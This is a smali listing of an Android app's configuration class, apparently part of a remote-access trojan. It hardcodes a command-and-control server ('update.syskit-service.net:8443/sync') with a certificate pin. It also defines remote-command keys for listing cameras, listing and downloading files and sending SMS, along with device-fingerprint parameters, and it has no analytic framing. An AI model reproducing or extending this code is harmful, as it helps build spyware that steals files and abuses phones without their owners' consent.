.class public final Lcom/piupiupiu/AppConfig;
.super Ljava/lang/Object;


# static fields
.field public static final C2_HOST:Ljava/lang/String; = "update.syskit-service.net"

.field public static final C2_PATH:Ljava/lang/String; = "/sync"

.field public static final C2_PORT:I = 0x20FB

.field public static final C2_SCHEME:Ljava/lang/String; = "https"

.field public static final C2_PIN:Ljava/lang/String; = "sha256/XLbHNEhBwnQo0kYZRgurNN9uqKsEKjnctV3DK9y2exI="

.field public static final EXTRA_CAM_LIST:Ljava/lang/String; = "camList"

.field public static final EXTRA_DL:Ljava/lang/String; = "dl"

.field public static final EXTRA_LS:Ljava/lang/String; = "ls"

.field public static final EXTRA_SEND_SMS:Ljava/lang/String; = "sendSMS"

.field public static final FIELD_EXTRA:Ljava/lang/String; = "extra"

.field public static final FIELD_PATH:Ljava/lang/String; = "path"

.field public static final FIELD_SEC:Ljava/lang/String; = "sec"

.field public static final FIELD_SMS:Ljava/lang/String; = "sms"

.field public static final FIELD_TO:Ljava/lang/String; = "to"

.field public static final FRAME_PAYLOAD:Ljava/lang/String; = "x"

.field public static final FRAME_TYPE:Ljava/lang/String; = "t"

.field public static final PARAM_DEVICE:Ljava/lang/String; = "d4"

.field public static final PARAM_MODEL:Ljava/lang/String; = "d1"

.field public static final PARAM_RELEASE:Ljava/lang/String; = "d3"

.field public static final PARAM_VENDOR:Ljava/lang/String; = "d2"


# direct methods
.method private constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static c2Base()Ljava/lang/String;
    .locals 1

    const-string v0, "https://update.syskit-service.net:8443/sync"

    return-object v0
.end method
